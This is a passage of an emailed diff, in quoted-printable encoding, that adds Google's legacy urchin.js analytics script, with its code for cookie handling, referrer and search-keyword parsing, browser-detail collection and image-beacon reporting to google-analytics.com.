+//_uOno[0]=3D"urchin";=0A=
+//_uOno[1]=3D"urchin.com";=0A=
+//_uOno[2]=3D"www.urchin.com";=0A=
+=0A=
+//-- Referral domains to Ignore=0A=
+var _uRno=3Dnew Array();=0A=
+//_uRno[0]=3D".urchin.com";=0A=
+=0A=
+//-- **** Don't modify below this point ***=0A=
+var =
+_uff,_udh,_udt,_ubl=3D0,_udo=3D"",_uu,_ufns=3D0,_uns=3D0,_ur=3D"-",_ufno=3D=
+0,_ust=3D0,_ubd=3Ddocument,_udl=3D_ubd.location,_udlh=3D"",_uwv=3D"1.3";=0A=
+var _ugifpath2=3D"http://www.google-analytics.com/__utm.gif";=0A=
+if (_udl.hash) _udlh=3D_udl.href.substring(_udl.href.indexOf('#'));=0A=
+if (_udl.protocol=3D=3D"https:") =
+_ugifpath2=3D"https://ssl.google-analytics.com/__utm.gif";=0A=
+if (!_utcp || _utcp=3D=3D"") _utcp=3D"/";=0A=
+function urchinTracker(page) {=0A=
+ if (_udl.protocol=3D=3D"file:") return;=0A=
+ if (_uff && (!page || page=3D=3D"")) return;=0A=
+ var a,b,c,xx,v,z,k,x=3D"",s=3D"",f=3D0,nv=3D0;=0A=
+ var nx=3D" expires=3D"+_uNx()+";";=0A=
+ var dc=3D_ubd.cookie;=0A=
+ _udh=3D_uDomain();=0A=
+ if (!_uVG()) return;=0A=
+ _uu=3DMath.round(Math.random()*2147483647);=0A=
+ _udt=3Dnew Date();=0A=
+ _ust=3DMath.round(_udt.getTime()/1000);=0A=
+ a=3Ddc.indexOf("__utma=3D"+_udh+".");=0A=
+ b=3Ddc.indexOf("__utmb=3D"+_udh);=0A=
+ c=3Ddc.indexOf("__utmc=3D"+_udh);=0A=
+ if (_udn && _udn!=3D"") { _udo=3D" domain=3D"+_udn+";"; }=0A=
+ if (_utimeout && _utimeout!=3D"") {=0A=
+  x=3Dnew Date(_udt.getTime()+(_utimeout*1000));=0A=
+  x=3D" expires=3D"+x.toGMTString()+";";=0A=
+ }=0A=
+ if (_ulink) {=0A=
+  if (_uanchor && _udlh && _udlh!=3D"") s=3D_udlh+"&";=0A=
+  s+=3D_udl.search;=0A=
+  if(s && s!=3D"" && s.indexOf("__utma=3D")>=3D0) {=0A=
+   if (!(_uIN(a=3D_uGC(s,"__utma=3D","&")))) a=3D"-";=0A=
+   if (!(_uIN(b=3D_uGC(s,"__utmb=3D","&")))) b=3D"-";=0A=
+   if (!(_uIN(c=3D_uGC(s,"__utmc=3D","&")))) c=3D"-";=0A=
+   v=3D_uGC(s,"__utmv=3D","&");=0A=
+   z=3D_uGC(s,"__utmz=3D","&");=0A=
+   k=3D_uGC(s,"__utmk=3D","&");=0A=
+   xx=3D_uGC(s,"__utmx=3D","&");=0A=
+   if ((k*1) !=3D ((_uHash(a+b+c+xx+z+v)*1)+(_udh*1))) =
+{_ubl=3D1;a=3D"-";b=3D"-";c=3D"-";xx=3D"-";z=3D"-";v=3D"-";}=0A=
+   if (a!=3D"-" && b!=3D"-" && c!=3D"-") f=3D1;=0A=
+   else if(a!=3D"-") f=3D2;=0A=
+  }=0A=
+ }=0A=
+ if(f=3D=3D1) {=0A=
+  _ubd.cookie=3D"__utma=3D"+a+"; path=3D"+_utcp+";"+nx+_udo;=0A=
+  _ubd.cookie=3D"__utmb=3D"+b+"; path=3D"+_utcp+";"+x+_udo;=0A=
+  _ubd.cookie=3D"__utmc=3D"+c+"; path=3D"+_utcp+";"+_udo;=0A=
+ } else if (f=3D=3D2) {=0A=
+  a=3D_uFixA(s,"&",_ust);=0A=
+  _ubd.cookie=3D"__utma=3D"+a+"; path=3D"+_utcp+";"+nx+_udo;=0A=
+  _ubd.cookie=3D"__utmb=3D"+_udh+"; path=3D"+_utcp+";"+x+_udo;=0A=
+  _ubd.cookie=3D"__utmc=3D"+_udh+"; path=3D"+_utcp+";"+_udo;=0A=
+  _ufns=3D1;=0A=
+ } else if (a>=3D0 && b>=3D0 && c>=3D0) {=0A=
+   b =3D _uGC(dc,"__utmb=3D"+_udh,";");=0A=
+   b =3D ("-" =3D=3D b) ? _udh : b;  =0A=
+  _ubd.cookie=3D"__utmb=3D"+b+"; path=3D"+_utcp+";"+x+_udo;=0A=
+ } else {=0A=
+  if (a>=3D0) a=3D_uFixA(_ubd.cookie,";",_ust);=0A=
+  else {=0A=
+   a=3D_udh+"."+_uu+"."+_ust+"."+_ust+"."+_ust+".1";=0A=
+   nv=3D1;=0A=
+  }=0A=
+  _ubd.cookie=3D"__utma=3D"+a+"; path=3D"+_utcp+";"+nx+_udo;=0A=
+  _ubd.cookie=3D"__utmb=3D"+_udh+"; path=3D"+_utcp+";"+x+_udo;=0A=
+  _ubd.cookie=3D"__utmc=3D"+_udh+"; path=3D"+_utcp+";"+_udo;=0A=
+  _ufns=3D1;=0A=
+ }=0A=
+ if (_ulink && xx && xx!=3D"" && xx!=3D"-") {=0A=
+   xx=3D_uUES(xx);=0A=
+   if (xx.indexOf(";")=3D=3D-1) _ubd.cookie=3D"__utmx=3D"+xx+"; =
+path=3D"+_utcp+";"+nx+_udo;=0A=
+ }=0A=
+ if (_ulink && v && v!=3D"" && v!=3D"-") {=0A=
+  v=3D_uUES(v);=0A=
+  if (v.indexOf(";")=3D=3D-1) _ubd.cookie=3D"__utmv=3D"+v+"; =
+path=3D"+_utcp+";"+nx+_udo;=0A=
+ }=0A=
+ var wc=3Dwindow;=0A=
+ var c=3D_ubd.cookie;=0A=
+ if(wc && wc.gaGlobal && wc.gaGlobal.dh=3D=3D_udh){=0A=
+  var g=3Dwc.gaGlobal;=0A=
+  var ua=3Dc.split("__utma=3D"+_udh+".")[1].split(";")[0].split(".");=0A=
+  if(g.sid)ua[3]=3Dg.sid;=0A=
+  if(nv>0){=0A=
+   ua[2]=3Dua[3];=0A=
+   if(g.vid){=0A=
+    var v=3Dg.vid.split(".");=0A=
+    ua[0]=3Dv[0];=0A=
+    ua[1]=3Dv[1];=0A=
+   }=0A=
+  }=0A=
+  _ubd.cookie=3D"__utma=3D"+_udh+"."+ua.join(".")+"; =
+path=3D"+_utcp+";"+nx+_udo;=0A=
+ }=0A=
+ _uInfo(page);=0A=
+ _ufns=3D0;=0A=
+ _ufno=3D0;=0A=
+ if (!page || page=3D=3D"") _uff=3D1;=0A=
+}=0A=
+function _uGH() {=0A=
+ var hid;=0A=
+ var wc=3Dwindow;=0A=
+ if (wc && wc.gaGlobal && wc.gaGlobal.hid) {=0A=
+  hid=3Dwc.gaGlobal.hid;=0A=
+ } else {=0A=
+  hid=3DMath.round(Math.random()*0x7fffffff);=0A=
+  if (!wc.gaGlobal) wc.gaGlobal=3D{};=0A=
+  wc.gaGlobal.hid=3Dhid;=0A=
+ }=0A=
+ return hid;=0A=
+}=0A=
+function _uInfo(page) {=0A=
+ var p,s=3D"",dm=3D"",pg=3D_udl.pathname+_udl.search;=0A=
+ if (page && page!=3D"") pg=3D_uES(page,1);=0A=
+ _ur=3D_ubd.referrer;=0A=
+ if (!_ur || _ur=3D=3D"") { _ur=3D"-"; }=0A=
+ else {=0A=
+  dm=3D_ubd.domain;=0A=
+  if(_utcp && _utcp!=3D"/") dm+=3D_utcp;=0A=
+  p=3D_ur.indexOf(dm);=0A=
+  if ((p>=3D0) && (p<=3D8)) { _ur=3D"0"; }=0A=
+  if (_ur.indexOf("[")=3D=3D0 && =
+_ur.lastIndexOf("]")=3D=3D(_ur.length-1)) { _ur=3D"-"; }=0A=
+ }=0A=
+ s+=3D"&utmn=3D"+_uu;=0A=
+ if (_ufsc) s+=3D_uBInfo();=0A=
+ if (_uctm) s+=3D_uCInfo();=0A=
+ if (_utitle && _ubd.title && _ubd.title!=3D"") =
+s+=3D"&utmdt=3D"+_uES(_ubd.title);=0A=
+ if (_udl.hostname && _udl.hostname!=3D"") =
+s+=3D"&utmhn=3D"+_uES(_udl.hostname);=0A=
+ if (_usample && _usample !=3D 100) s+=3D"&utmsp=3D"+_uES(_usample);=0A=
+ s+=3D"&utmhid=3D"+_uGH();=0A=
+ s+=3D"&utmr=3D"+_ur;=0A=
+ s+=3D"&utmp=3D"+pg;=0A=
+ if ((_userv=3D=3D0 || _userv=3D=3D2) && _uSP()) {=0A=
+  var i=3Dnew Image(1,1);=0A=
+  i.src=3D_ugifpath+"?"+"utmwv=3D"+_uwv+s;=0A=
+  i.onload=3Dfunction() { _uVoid(); }=0A=
+ }=0A=
+ if ((_userv=3D=3D1 || _userv=3D=3D2) && _uSP()) {=0A=
+  var i2=3Dnew Image(1,1);=0A=
+  =
+i2.src=3D_ugifpath2+"?"+"utmwv=3D"+_uwv+s+"&utmac=3D"+_uacct+"&utmcc=3D"+=
+_uGCS();=0A=
+  i2.onload=3Dfunction() { _uVoid(); }=0A=
+ }=0A=
+ return;=0A=
+}=0A=
+function _uVoid() { return; }=0A=
+function _uCInfo() {=0A=
+ if (!_ucto || _ucto=3D=3D"") { _ucto=3D"15768000"; }=0A=
+ if (!_uVG()) return;=0A=
+ var =
+c=3D"",t=3D"-",t2=3D"-",t3=3D"-",o=3D0,cs=3D0,cn=3D0,i=3D0,z=3D"-",s=3D""=
+;=0A=
+ if (_uanchor && _udlh && _udlh!=3D"") s=3D_udlh+"&";=0A=
+ s+=3D_udl.search;=0A=
+ var x=3Dnew Date(_udt.getTime()+(_ucto*1000));=0A=
+ var dc=3D_ubd.cookie;=0A=
+ x=3D" expires=3D"+x.toGMTString()+";";=0A=
+ if (_ulink && !_ubl) {=0A=
+  z=3D_uUES(_uGC(s,"__utmz=3D","&"));=0A=
+  if (z!=3D"-" && z.indexOf(";")=3D=3D-1) { =
+_ubd.cookie=3D"__utmz=3D"+z+"; path=3D"+_utcp+";"+x+_udo; return ""; }=0A=
+ }=0A=
+ z=3Ddc.indexOf("__utmz=3D"+_udh+".");=0A=
+ if (z>-1) { z=3D_uGC(dc,"__utmz=3D"+_udh+".",";"); }=0A=
+ else { z=3D"-"; }=0A=
+ t=3D_uGC(s,_ucid+"=3D","&");=0A=
+ t2=3D_uGC(s,_ucsr+"=3D","&");=0A=
+ t3=3D_uGC(s,"gclid=3D","&");=0A=
+ if ((t!=3D"-" && t!=3D"") || (t2!=3D"-" && t2!=3D"") || (t3!=3D"-" && =
+t3!=3D"")) {=0A=
+  if (t!=3D"-" && t!=3D"") c+=3D"utmcid=3D"+_uEC(t);=0A=
+  if (t2!=3D"-" && t2!=3D"") { if (c !=3D "") c+=3D"|"; =
+c+=3D"utmcsr=3D"+_uEC(t2); }=0A=
+  if (t3!=3D"-" && t3!=3D"") { if (c !=3D "") c+=3D"|"; =
+c+=3D"utmgclid=3D"+_uEC(t3); }=0A=
+  t=3D_uGC(s,_uccn+"=3D","&");=0A=
+  if (t!=3D"-" && t!=3D"") c+=3D"|utmccn=3D"+_uEC(t);=0A=
+  else c+=3D"|utmccn=3D(not+set)";=0A=
+  t=3D_uGC(s,_ucmd+"=3D","&");=0A=
+  if (t!=3D"-" && t!=3D"") c+=3D"|utmcmd=3D"+_uEC(t);=0A=
+  else  c+=3D"|utmcmd=3D(not+set)";=0A=
+  t=3D_uGC(s,_uctr+"=3D","&");=0A=
+  if (t!=3D"-" && t!=3D"") c+=3D"|utmctr=3D"+_uEC(t);=0A=
+  else { t=3D_uOrg(1); if (t!=3D"-" && t!=3D"") =
+c+=3D"|utmctr=3D"+_uEC(t); }=0A=
+  t=3D_uGC(s,_ucct+"=3D","&");=0A=
+  if (t!=3D"-" && t!=3D"") c+=3D"|utmcct=3D"+_uEC(t);=0A=
+  t=3D_uGC(s,_ucno+"=3D","&");=0A=
+  if (t=3D=3D"1") o=3D1;=0A=
+  if (z!=3D"-" && o=3D=3D1) return "";=0A=
+ }=0A=
+ if (c=3D=3D"-" || c=3D=3D"") { c=3D_uOrg(); if (z!=3D"-" && =
+_ufno=3D=3D1)  return ""; }=0A=
+ if (c=3D=3D"-" || c=3D=3D"") { if (_ufns=3D=3D1)  c=3D_uRef(); if =
+(z!=3D"-" && _ufno=3D=3D1)  return ""; }=0A=
+ if (c=3D=3D"-" || c=3D=3D"") {=0A=
+  if (z=3D=3D"-" && _ufns=3D=3D1) { =
+c=3D"utmccn=3D(direct)|utmcsr=3D(direct)|utmcmd=3D(none)"; }=0A=
+  if (c=3D=3D"-" || c=3D=3D"") return "";=0A=
+ }=0A=
+ if (z!=3D"-") {=0A=
+  i=3Dz.indexOf(".");=0A=
+  if (i>-1) i=3Dz.indexOf(".",i+1);=0A=
+  if (i>-1) i=3Dz.indexOf(".",i+1);=0A=
+  if (i>-1) i=3Dz.indexOf(".",i+1);=0A=
+  t=3Dz.substring(i+1,z.length);=0A=
+  if (t.toLowerCase()=3D=3Dc.toLowerCase()) cs=3D1;=0A=
+  t=3Dz.substring(0,i);=0A=
+  if ((i=3Dt.lastIndexOf(".")) > -1) {=0A=
+   t=3Dt.substring(i+1,t.length);=0A=
+   cn=3D(t*1);=0A=
+  }=0A=
+ }=0A=
+ if (cs=3D=3D0 || _ufns=3D=3D1) {=0A=
+  t=3D_uGC(dc,"__utma=3D"+_udh+".",";");=0A=
+  if ((i=3Dt.lastIndexOf(".")) > 9) {=0A=
+   _uns=3Dt.substring(i+1,t.length);=0A=
+   _uns=3D(_uns*1);=0A=
+  }=0A=
+  cn++;=0A=
+  if (_uns=3D=3D0) _uns=3D1;=0A=
+  _ubd.cookie=3D"__utmz=3D"+_udh+"."+_ust+"."+_uns+"."+cn+"."+c+"; =
+path=3D"+_utcp+"; "+x+_udo;=0A=
+ }=0A=
+ if (cs=3D=3D0 || _ufns=3D=3D1) return "&utmcn=3D1";=0A=
+ else return "&utmcr=3D1";=0A=
+}=0A=
+function _uRef() {=0A=
+ if (_ur=3D=3D"0" || _ur=3D=3D"" || _ur=3D=3D"-") return "";=0A=
+ var i=3D0,h,k,n;=0A=
+ if ((i=3D_ur.indexOf("://"))<0 || _uGCse()) return "";=0A=
+ h=3D_ur.substring(i+3,_ur.length);=0A=
+ if (h.indexOf("/") > -1) {=0A=
+  k=3Dh.substring(h.indexOf("/"),h.length);=0A=
+  if (k.indexOf("?") > -1) k=3Dk.substring(0,k.indexOf("?"));=0A=
+  h=3Dh.substring(0,h.indexOf("/"));=0A=
+ }=0A=
+ h=3Dh.toLowerCase();=0A=
+ n=3Dh;=0A=
+ if ((i=3Dn.indexOf(":")) > -1) n=3Dn.substring(0,i);=0A=
+ for (var ii=3D0;ii<_uRno.length;ii++) {=0A=
+  if ((i=3Dn.indexOf(_uRno[ii].toLowerCase())) > -1 && =
+n.length=3D=3D(i+_uRno[ii].length)) { _ufno=3D1; break; }=0A=
+ }=0A=
+ if (h.indexOf("www.")=3D=3D0) h=3Dh.substring(4,h.length);=0A=
+ return =
+"utmccn=3D(referral)|utmcsr=3D"+_uEC(h)+"|"+"utmcct=3D"+_uEC(k)+"|utmcmd=3D=
+referral";=0A=
+}=0A=
+function _uOrg(t) {=0A=
+ if (_ur=3D=3D"0" || _ur=3D=3D"" || _ur=3D=3D"-") return "";=0A=
+ var i=3D0,h,k;=0A=
+ if ((i=3D_ur.indexOf("://"))<0 || _uGCse()) return "";=0A=
+ h=3D_ur.substring(i+3,_ur.length);=0A=
+ if (h.indexOf("/") > -1) {=0A=
+  h=3Dh.substring(0,h.indexOf("/"));=0A=
+ }=0A=
+ for (var ii=3D0;ii<_uOsr.length;ii++) {=0A=
+  if (h.toLowerCase().indexOf(_uOsr[ii].toLowerCase()) > -1) {=0A=
+   if ((i=3D_ur.indexOf("?"+_uOkw[ii]+"=3D")) > -1 || =
+(i=3D_ur.indexOf("&"+_uOkw[ii]+"=3D")) > -1) {=0A=
+    k=3D_ur.substring(i+_uOkw[ii].length+2,_ur.length);=0A=
+    if ((i=3Dk.indexOf("&")) > -1) k=3Dk.substring(0,i);=0A=
+    for (var yy=3D0;yy<_uOno.length;yy++) {=0A=
+     if (_uOno[yy].toLowerCase()=3D=3Dk.toLowerCase()) { _ufno=3D1; =
+break; }=0A=
+    }=0A=
+    if (t) return _uEC(k);=0A=
+    else return =
+"utmccn=3D(organic)|utmcsr=3D"+_uEC(_uOsr[ii])+"|"+"utmctr=3D"+_uEC(k)+"|=
+utmcmd=3Dorganic";=0A=
+   }=0A=
+  }=0A=
+ }=0A=
+ return "";=0A=
+}=0A=
+function _uGCse() {=0A=
+ var h,p;=0A=
+ h=3Dp=3D_ur.split("://")[1];=0A=
+ if(h.indexOf("/")>-1) {=0A=
+  h=3Dh.split("/")[0];=0A=
+  p=3Dp.substring(p.indexOf("/")+1,p.length);=0A=
+ }=0A=
+ if(p.indexOf("?")>-1) {=0A=
+  p=3Dp.split("?")[0];=0A=
+ }=0A=
+ if(h.toLowerCase().indexOf("google")>-1) {=0A=
+  if(_ur.indexOf("?q=3D")>-1 || _ur.indexOf("&q=3D")>-1) {=0A=
+   if (p.toLowerCase().indexOf("cse")>-1) {=0A=
+    return true;=0A=
+   }=0A=
+  }=0A=
+ }=0A=
+}=0A=
+function _uBInfo() {=0A=
+ var sr=3D"-",sc=3D"-",ul=3D"-",fl=3D"-",cs=3D"-",je=3D1;=0A=
+ var n=3Dnavigator;=0A=
+ if (self.screen) {=0A=
+  sr=3Dscreen.width+"x"+screen.height;=0A=
+  sc=3Dscreen.colorDepth+"-bit";=0A=
+ } else if (self.java) {=0A=
+  var j=3Djava.awt.Toolkit.getDefaultToolkit();=0A=
+  var s=3Dj.getScreenSize();=0A=
+  sr=3Ds.width+"x"+s.height;=0A=
+ }=0A=
+ if (n.language) { ul=3Dn.language.toLowerCase(); }=0A=
+ else if (n.browserLanguage) { ul=3Dn.browserLanguage.toLowerCase(); }=0A=
+ je=3Dn.javaEnabled()?1:0;=0A=
+ if (_uflash) fl=3D_uFlash();=0A=
+ if (_ubd.characterSet) cs=3D_uES(_ubd.characterSet);=0A=
+ else if (_ubd.charset) cs=3D_uES(_ubd.charset);=0A=
+ return =
+"&utmcs=3D"+cs+"&utmsr=3D"+sr+"&utmsc=3D"+sc+"&utmul=3D"+ul+"&utmje=3D"+j=
+e+"&utmfl=3D"+fl;=0A=
+}=0A=
+function __utmSetTrans() {=0A=
+ var e;=0A=
+ if (_ubd.getElementById) e=3D_ubd.getElementById("utmtrans");=0A=
+ else if (_ubd.utmform && _ubd.utmform.utmtrans) =
+e=3D_ubd.utmform.utmtrans;=0A=
+ if (!e) return;=0A=
+ var l=3De.value.split("UTM:");=0A=
+ var i,i2,c;=0A=
+ if (_userv=3D=3D0 || _userv=3D=3D2) i=3Dnew Array();=0A=
+ if (_userv=3D=3D1 || _userv=3D=3D2) { i2=3Dnew Array(); c=3D_uGCS(); }=0A=
+=0A=
+ for (var ii=3D0;ii<l.length;ii++) {=0A=
+  l[ii]=3D_uTrim(l[ii]);=0A=
+  if (l[ii].charAt(0)!=3D'T' && l[ii].charAt(0)!=3D'I') continue;=0A=
+  var r=3DMath.round(Math.random()*2147483647);=0A=
+  if (!_utsp || _utsp=3D=3D"") _utsp=3D"|";=0A=
+  var f=3Dl[ii].split(_utsp),s=3D"";=0A=
+  if (f[0].charAt(0)=3D=3D'T') {=0A=
+   s=3D"&utmt=3Dtran"+"&utmn=3D"+r;=0A=
+   f[1]=3D_uTrim(f[1]); if(f[1]&&f[1]!=3D"") =
+s+=3D"&utmtid=3D"+_uES(f[1]);=0A=
+   f[2]=3D_uTrim(f[2]); if(f[2]&&f[2]!=3D"") =
+s+=3D"&utmtst=3D"+_uES(f[2]);=0A=
+   f[3]=3D_uTrim(f[3]); if(f[3]&&f[3]!=3D"") =
+s+=3D"&utmtto=3D"+_uES(f[3]);=0A=
+   f[4]=3D_uTrim(f[4]); if(f[4]&&f[4]!=3D"") =
+s+=3D"&utmttx=3D"+_uES(f[4]);=0A=
+   f[5]=3D_uTrim(f[5]); if(f[5]&&f[5]!=3D"") =
+s+=3D"&utmtsp=3D"+_uES(f[5]);=0A=
+   f[6]=3D_uTrim(f[6]); if(f[6]&&f[6]!=3D"") =
+s+=3D"&utmtci=3D"+_uES(f[6]);=0A=
+   f[7]=3D_uTrim(f[7]); if(f[7]&&f[7]!=3D"") =
+s+=3D"&utmtrg=3D"+_uES(f[7]);=0A=
+   f[8]=3D_uTrim(f[8]); if(f[8]&&f[8]!=3D"") =
+s+=3D"&utmtco=3D"+_uES(f[8]);=0A=
+  } else {=0A=
+   s=3D"&utmt=3Ditem"+"&utmn=3D"+r;=0A=
+   f[1]=3D_uTrim(f[1]); if(f[1]&&f[1]!=3D"") =
+s+=3D"&utmtid=3D"+_uES(f[1]);=0A=
+   f[2]=3D_uTrim(f[2]); if(f[2]&&f[2]!=3D"") =
+s+=3D"&utmipc=3D"+_uES(f[2]);=0A=
+   f[3]=3D_uTrim(f[3]); if(f[3]&&f[3]!=3D"") =
+s+=3D"&utmipn=3D"+_uES(f[3]);=0A=
+   f[4]=3D_uTrim(f[4]); if(f[4]&&f[4]!=3D"") =
+s+=3D"&utmiva=3D"+_uES(f[4]);=0A=
+   f[5]=3D_uTrim(f[5]); if(f[5]&&f[5]!=3D"") =
+s+=3D"&utmipr=3D"+_uES(f[5]);=0A=
+   f[6]=3D_uTrim(f[6]); if(f[6]&&f[6]!=3D"") =
+s+=3D"&utmiqt=3D"+_uES(f[6]);=0A=
+  }=0A=
+  if (_udl.hostname && _udl.hostname!=3D"") =
+s+=3D"&utmhn=3D"+_uES(_udl.hostname);=0A=
+  if (_usample && _usample !=3D 100) s+=3D"&utmsp=3D"+_uES(_usample);=0A=
+=0A=
+  if ((_userv=3D=3D0 || _userv=3D=3D2) && _uSP()) {=0A=
+   i[ii]=3Dnew Image(1,1);=0A=
+   i[ii].src=3D_ugifpath+"?"+"utmwv=3D"+_uwv+s;=0A=
+   i[ii].onload=3Dfunction() { _uVoid(); }=0A=
+  }=0A=
+  if ((_userv=3D=3D1 || _userv=3D=3D2) && _uSP()) {=0A=
+   i2[ii]=3Dnew Image(1,1);=0A=
+   =
+i2[ii].src=3D_ugifpath2+"?"+"utmwv=3D"+_uwv+s+"&utmac=3D"+_uacct+"&utmcc=3D=
+"+c;=0A=
+   i2[ii].onload=3Dfunction() { _uVoid(); }=0A=
+  }=0A=
+ }=0A=
+ return;=0A=
+}=0A=
+function _uFlash() {=0A=
+ var f=3D"-",n=3Dnavigator;=0A=
+ if (n.plugins && n.plugins.length) {=0A=
+  for (var ii=3D0;ii<n.plugins.length;ii++) {=0A=
+   if (n.plugins[ii].name.indexOf('Shockwave Flash')!=3D-1) {=0A=
+    f=3Dn.plugins[ii].description.split('Shockwave Flash ')[1];=0A=
+    break;=0A=
+   }=0A=
+  }=0A=
+ } else {=0A=
+  var fl;=0A=
+  try {=0A=
+   fl =3D new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");=0A=
+   f =3D fl.GetVariable("$version");=0A=
+  } catch(e) {}=0A=
+  if (f =3D=3D "-") {=0A=
+   try {=0A=
+    fl =3D new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");=0A=
+    f =3D "WIN 6,0,21,0";=0A=
+    fl.AllowScriptAccess =3D "always";=0A=
+    f =3D fl.GetVariable("$version");=0A=
+   } catch(e) {}=0A=
+  }=0A=
+  if (f =3D=3D "-") {=0A=
+   try {=0A=
+    fl =3D new ActiveXObject("ShockwaveFlash.ShockwaveFlash");=0A=
+    f =3D fl.GetVariable("$version");=0A=
+   } catch(e) {}=0A=
+  }=0A=
+  if (f !=3D "-") {=0A=
+   f =3D f.split(" ")[1].split(",");=0A=
+   f =3D f[0] + "." + f[1] + " r" + f[2];=0A=
+  }=0A=
+ }=0A=
+ return f;=0A=
+}=0A=
+function __utmLinkerUrl(l,h) {=0A=
+ var p,k,a=3D"-",b=3D"-",c=3D"-",x=3D"-",z=3D"-",v=3D"-";=0A=
+ var dc=3D_ubd.cookie;=0A=
+ var iq =3D l.indexOf("?");=0A=
+ var ih =3D l.indexOf("#");=0A=
+ var url=3Dl;=0A=
+ if (dc) {=0A=
+  a=3D_uES(_uGC(dc,"__utma=3D"+_udh+".",";"));=0A=
+  b=3D_uES(_uGC(dc,"__utmb=3D"+_udh,";"));=0A=
+  c=3D_uES(_uGC(dc,"__utmc=3D"+_udh,";"));=0A=
+  x=3D_uES(_uGC(dc,"__utmx=3D"+_udh,";"));=0A=
+  z=3D_uES(_uGC(dc,"__utmz=3D"+_udh+".",";"));=0A=
+  v=3D_uES(_uGC(dc,"__utmv=3D"+_udh+".",";"));=0A=
+  k=3D(_uHash(a+b+c+x+z+v)*1)+(_udh*1);=0A=
+  =
+p=3D"__utma=3D"+a+"&__utmb=3D"+b+"&__utmc=3D"+c+"&__utmx=3D"+x+"&__utmz=3D=
+"+z+"&__utmv=3D"+v+"&__utmk=3D"+k;=0A=
+ }=0A=
+ if (p) {=0A=
+  if (h && ih>-1) return;=0A=
+  if (h) { url=3Dl+"#"+p; }=0A=
+  else {=0A=
+   if (iq=3D=3D-1 && ih=3D=3D-1) url=3Dl+"?"+p;=0A=
+   else if (ih=3D=3D-1) url=3Dl+"&"+p;=0A=
+   else if (iq=3D=3D-1) url=3Dl.substring(0,ih-1)+"?"+p+l.substring(ih);=0A=
+   else url=3Dl.substring(0,ih-1)+"&"+p+l.substring(ih);=0A=
+  }=0A=
+ }=0A=
+ return url;=0A=
+}=0A=
+function __utmLinker(l,h) {=0A=
+ if (!_ulink || !l || l=3D=3D"") return;=0A=
+ _udl.href=3D__utmLinkerUrl(l,h);=0A=
+}=0A=
+function __utmLinkPost(f,h) {=0A=
+ if (!_ulink || !f || !f.action) return;=0A=
+ f.action=3D__utmLinkerUrl(f.action, h);=0A=
+ return;=0A=
+}=0A=
+function __utmSetVar(v) {=0A=
+ if (!v || v=3D=3D"") return;=0A=
+ if (!_udo || _udo =3D=3D "") {=0A=
+  _udh=3D_uDomain();=0A=
+  if (_udn && _udn!=3D"") { _udo=3D" domain=3D"+_udn+";"; }=0A=
+ }=0A=
+ if (!_uVG()) return;=0A=
+ var r=3DMath.round(Math.random() * 2147483647);=0A=
+ _ubd.cookie=3D"__utmv=3D"+_udh+"."+_uES(v)+"; path=3D"+_utcp+"; =
+expires=3D"+_uNx()+";"+_udo;=0A=
+ var s=3D"&utmt=3Dvar&utmn=3D"+r;=0A=
+ if (_usample && _usample !=3D 100) s+=3D"&utmsp=3D"+_uES(_usample);=0A=
+ if ((_userv=3D=3D0 || _userv=3D=3D2) && _uSP()) {=0A=
+  var i=3Dnew Image(1,1);=0A=
+  i.src=3D_ugifpath+"?"+"utmwv=3D"+_uwv+s;=0A=
+  i.onload=3Dfunction() { _uVoid(); }=0A=
+ }=0A=
+ if ((_userv=3D=3D1 || _userv=3D=3D2) && _uSP()) {=0A=
+  var i2=3Dnew Image(1,1);=0A=
+  =
+i2.src=3D_ugifpath2+"?"+"utmwv=3D"+_uwv+s+"&utmac=3D"+_uacct+"&utmcc=3D"+=
+_uGCS();=0A=
+  i2.onload=3Dfunction() { _uVoid(); }=0A=
+ }=0A=
+}=0A=
+function _uGCS() {=0A=
+ var t,c=3D"",dc=3D_ubd.cookie;=0A=
+ if ((t=3D_uGC(dc,"__utma=3D"+_udh+".",";"))!=3D"-") =
+c+=3D_uES("__utma=3D"+t+";+");=0A=
+ if ((t=3D_uGC(dc,"__utmx=3D"+_udh,";"))!=3D"-") =
+c+=3D_uES("__utmx=3D"+t+";+");=0A=
+ if ((t=3D_uGC(dc,"__utmz=3D"+_udh+".",";"))!=3D"-") =
+c+=3D_uES("__utmz=3D"+t+";+");=0A=
+ if ((t=3D_uGC(dc,"__utmv=3D"+_udh+".",";"))!=3D"-") =
+c+=3D_uES("__utmv=3D"+t+";");=0A=
+ if (c.charAt(c.length-1)=3D=3D"+") c=3Dc.substring(0,c.length-1);=0A=
+ return c;=0A=
+}=0A=
+function _uGC(l,n,s) {=0A=
+ if (!l || l=3D=3D"" || !n || n=3D=3D"" || !s || s=3D=3D"") return "-";=0A=
+ var i,i2,i3,c=3D"-";=0A=
+ i=3Dl.indexOf(n);=0A=
+ i3=3Dn.indexOf("=3D")+1;=0A=
+ if (i > -1) {=0A=
+  i2=3Dl.indexOf(s,i); if (i2 < 0) { i2=3Dl.length; }=0A=
+  c=3Dl.substring((i+i3),i2);=0A=
+ }=0A=
+ return c;=0A=
+}=0A=
+function _uDomain() {=0A=
+ if (!_udn || _udn=3D=3D"" || _udn=3D=3D"none") { _udn=3D""; return 1; }=0A=
+ if (_udn=3D=3D"auto") {=0A=
+  var d=3D_ubd.domain;=0A=
+  if (d.substring(0,4)=3D=3D"www.") {=0A=
+   d=3Dd.substring(4,d.length);=0A=
+  }=0A=
+  _udn=3Dd;=0A=
+ }=0A=
+ _udn =3D _udn.toLowerCase(); =0A=
+ if (_uhash=3D=3D"off") return 1;=0A=
+ return _uHash(_udn);=0A=
+}=0A=
+function _uHash(d) {=0A=
+ if (!d || d=3D=3D"") return 1;=0A=
+ var h=3D0,g=3D0;=0A=
+ for (var i=3Dd.length-1;i>=3D0;i--) {=0A=
+  var c=3DparseInt(d.charCodeAt(i));=0A=
+  h=3D((h << 6) & 0xfffffff) + c + (c << 14);=0A=
+  if ((g=3Dh & 0xfe00000)!=3D0) h=3D(h ^ (g >> 21));=0A=
+ }=0A=
+ return h;=0A=
+}=0A=
+function _uFixA(c,s,t) {=0A=
+ if (!c || c=3D=3D"" || !s || s=3D=3D"" || !t || t=3D=3D"") return "-";=0A=
+ var a=3D_uGC(c,"__utma=3D"+_udh+".",s);=0A=
+ var lt=3D0,i=3D0;=0A=
+ if ((i=3Da.lastIndexOf(".")) > 9) {=0A=
+  _uns=3Da.substring(i+1,a.length);=0A=
+  _uns=3D(_uns*1)+1;=0A=
+  a=3Da.substring(0,i);=0A=
+  if ((i=3Da.lastIndexOf(".")) > 7) {=0A=
